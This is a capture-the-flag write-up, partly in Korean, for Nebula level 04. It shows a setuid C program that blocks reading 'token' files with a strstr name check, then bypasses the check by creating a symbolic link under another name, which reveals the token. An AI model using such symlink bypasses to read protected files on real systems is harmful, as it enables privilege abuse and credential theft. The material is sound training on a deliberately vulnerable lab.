# Level 04

## Plot

### About

This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

## strstr을 우회하자

`/home/flag04` 디렉토리 아래에는 `token`파일과 `flag04` 실행파일이 있다. `token`은 아예 owner가 아니면 아무것도 못하게 만들어 놨다.

```text
level04@nebula:/home/flag04$ ls -l
total 8
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```

아래 조건문이 `token` 파일을 읽는 걸 막고 있다. 어떻게 하면 여길 우회해 들어갈 수 있을까?

```c
if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
}
```

GNU시스템은 다른 파일을 가리키는 `Soft Link`와 `Symbolic Link`라는 걸 지원한다. Window 운영체제의 바로가기 처럼 포인터같은 역할을 하는 파일이다. `open`함수는 파일이 `Symbolic Link`인지 아닌지 구분할 수 있고, 링크일 경우 가리키는 파일을 사용한다. 이 점을 이용해 `token` 문자열을 필터링 하는 루틴을 우회할 수 있다.

```bash
level04@nebula:~$ ln -s /home/flag04/token symlink
level04@nebula:~$ /home/flag04/flag04 symlink
06508b5e-8909-4f38-b630-fdb148a848a2
```

`token`이 아닌 다른 이름으로 심볼릭 링크를 생성하고, `flag04`에 심볼릭 링크를 넘겨주면 링크가 가리키는 `token`파일을 `open`하게 된다!

## 참고

- [심볼릭 링크에 대한 GNU 메뉴얼](https://www.gnu.org/software/libc/manual/html_node/Symbolic-Links.html)